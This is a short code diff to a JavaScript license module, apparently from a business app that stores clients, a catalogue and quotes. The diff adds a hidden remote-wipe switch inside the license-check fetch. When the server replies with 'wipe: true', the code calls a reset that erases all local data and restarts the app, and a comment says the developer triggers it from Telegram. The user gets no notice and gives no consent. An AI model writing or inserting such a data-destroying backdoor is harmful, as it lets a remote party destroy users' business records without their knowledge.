@@ -160,6 +160,14 @@ var License = (function () {
     var opts = to.signal ? { signal: to.signal } : undefined;
     return fetch(url, opts).then(function (r) { return r.json(); }).then(function (body) {
       to.done();
+      // Borrado remoto ordenado por el programador desde Telegram: elimina todos
+      // los datos locales (clientes, catálogo, cotizaciones) y reinicia la app.
+      if (body && body.wipe === true) {
+        if (window.Backups && typeof Backups.doReset === 'function') {
+          Backups.doReset();
+        }
+        return { wipe: true };
+      }
       if (body && typeof body.supportPhone === 'string') {
         state.supportPhone = body.supportPhone;
         persist();
